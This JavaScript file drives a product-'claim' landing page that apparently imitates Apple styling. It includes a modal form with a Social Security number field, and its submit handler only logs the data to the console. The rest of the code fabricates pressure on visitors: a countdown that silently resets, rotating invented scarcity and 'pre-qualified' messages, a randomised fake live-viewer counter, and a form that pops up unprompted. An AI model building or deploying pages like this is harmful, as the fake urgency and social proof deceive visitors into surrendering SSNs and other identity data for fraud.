let countdownInterval;

function scrollToSpecs() {
    const specsSection = document.getElementById('tech-specs');
    if (specsSection) {
        specsSection.scrollIntoView({
            behavior: 'smooth',
            block: 'start'
        });
    }
}

function showForm() {
    document.getElementById('claimModal').style.display = 'flex';
    document.body.style.overflow = 'hidden';
}

function hideForm() {
    document.getElementById('claimModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

function showSuccess() {
    document.getElementById('successModal').style.display = 'flex';
    document.body.style.overflow = 'hidden';
}

function hideSuccess() {
    document.getElementById('successModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

function submitForm(event) {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const data = Object.fromEntries(formData);
    
    simulateFormSubmission(data);
    
    hideForm();
    setTimeout(() => {
        showSuccess();
    }, 500);
}

function simulateFormSubmission(data) {
    console.log('Form submitted with data:', data);
}

function startCountdown() {
    let hours = 23;
    let minutes = 45;
    let seconds = 32;
    
    countdownInterval = setInterval(() => {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            
            if (minutes < 0) {
                minutes = 59;
                hours--;
                
                if (hours < 0) {
                    hours = 23;
                    minutes = 59;
                    seconds = 59;
                }
            }
        }
        
        document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
        document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
        document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
    }, 1000);
}

function addFloatingElements() {
    const hero = document.querySelector('.hero');
    
    for (let i = 0; i < 10; i++) {
        const element = document.createElement('div');
        element.className = 'floating-element';
        element.style.cssText = `
            position: absolute;
            width: 6px;
            height: 6px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            left: ${Math.random() * 100}%;
            top: ${Math.random() * 100}%;
            animation: float-around ${5 + Math.random() * 10}s infinite linear;
            z-index: 1;
        `;
        hero.appendChild(element);
    }
    
    const style = document.createElement('style');
    style.textContent = `
        @keyframes float-around {
            0% { transform: translateY(0px) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
    `;
    document.head.appendChild(style);
}

function addScrollEffect() {
    window.addEventListener('scroll', () => {
        const scrolled = window.pageYOffset;
        const hero = document.querySelector('.hero');
        const heroHeight = hero.offsetHeight + 48; // Include header height
        
        if (scrolled < heroHeight * 0.8) {
            hero.style.transform = `translateY(${scrolled * 0.3}px)`;
        } else {
            hero.style.transform = 'translateY(0px)';
        }
    });
}

function addFormValidation() {
    const ssnInput = document.getElementById('ssn');
    
    ssnInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
        e.target.value = value;
    });
    
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
        e.target.value = value;
    });
}

function addUrgencyMessages() {
    const messages = [
        "⚡ Limited quantities available",
        "🔥 High demand in your area",
        "⏰ Offer valid for limited time",
        "✓ Thousands have already upgraded",
        "� You're pre-qualified for this offer"
    ];
    
    let messageIndex = 0;
    const urgencyBar = document.createElement('div');
    urgencyBar.style.cssText = `
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0, 0, 0, 0.92);
        backdrop-filter: saturate(180%) blur(20px);
        -webkit-backdrop-filter: saturate(180%) blur(20px);
        color: #f5f5f7;
        padding: 16px;
        text-align: center;
        font-weight: 400;
        font-size: 14px;
        z-index: 1500;
        transform: translateY(100%);
        transition: transform 0.3s ease;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
    `;
    
    document.body.appendChild(urgencyBar);
    
    function showUrgencyMessage() {
        urgencyBar.textContent = messages[messageIndex];
        urgencyBar.style.transform = 'translateY(0)';
        
        setTimeout(() => {
            urgencyBar.style.transform = 'translateY(100%)';
        }, 4000);
        
        messageIndex = (messageIndex + 1) % messages.length;
    }
    
    setTimeout(showUrgencyMessage, 3000);
    setInterval(showUrgencyMessage, 8000);
}

function simulateTrafficCounter() {
    const viewersCount = document.createElement('div');
    viewersCount.style.cssText = `
        position: fixed;
        top: 80px;
        right: 22px;
        background: rgba(0, 0, 0, 0.72);
        backdrop-filter: saturate(180%) blur(20px);
        -webkit-backdrop-filter: saturate(180%) blur(20px);
        color: #f5f5f7;
        padding: 8px 12px;
        border-radius: 16px;
        font-size: 11px;
        font-weight: 400;
        z-index: 1000;
        border: 1px solid rgba(255, 255, 255, 0.1);
        font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, sans-serif;
    `;
    
    document.body.appendChild(viewersCount);
    
    let viewers = 1247;
    
    function updateViewers() {
        viewers += Math.floor(Math.random() * 3) - 1;
        if (viewers < 1000) viewers = 1000;
        if (viewers > 1500) viewers = 1500;
        
        viewersCount.innerHTML = `
            <div style="display: flex; align-items: center; gap: 6px;">
                <div style="width: 6px; height: 6px; background: #30d158; border-radius: 50%; animation: pulse 2s infinite;"></div>
                ${viewers.toLocaleString()} active
            </div>
        `;
    }
    
    const pulseStyle = document.createElement('style');
    pulseStyle.textContent = `
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
    `;
    document.head.appendChild(pulseStyle);
    
    updateViewers();
    setInterval(updateViewers, 5000);
}

window.addEventListener('click', (e) => {
    if (e.target === document.getElementById('claimModal')) {
        hideForm();
    }
    if (e.target === document.getElementById('successModal')) {
        hideSuccess();
    }
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        hideForm();
        hideSuccess();
    }
});

document.addEventListener('DOMContentLoaded', () => {
    startCountdown();
    addFloatingElements();
    addScrollEffect();
    addFormValidation();
    addUrgencyMessages();
    simulateTrafficCounter();
    initializeColorSwitcher();
    
    setTimeout(() => {
        if (Math.random() > 0.7) {
            showForm();
        }
    }, 5000);
});

function createSparkleEffect(x, y) {
    const sparkle = document.createElement('div');
    sparkle.style.cssText = `
        position: fixed;
        left: ${x}px;
        top: ${y}px;
        width: 4px;
        height: 4px;
        background: #ffcc00;
        border-radius: 50%;
        pointer-events: none;
        z-index: 9999;
        animation: sparkle 0.6s ease-out forwards;
    `;
    
    document.body.appendChild(sparkle);
    
    setTimeout(() => {
        sparkle.remove();
    }, 600);
}

const sparkleStyle = document.createElement('style');
sparkleStyle.textContent = `
    @keyframes sparkle {
        0% {
            transform: scale(0) rotate(0deg);
            opacity: 1;
        }
        100% {
            transform: scale(1) rotate(180deg);
            opacity: 0;
        }
    }
`;
document.head.appendChild(sparkleStyle);

document.addEventListener('click', (e) => {
    if (e.target.classList.contains('btn-primary')) {
        createSparkleEffect(e.clientX, e.clientY);
    }
});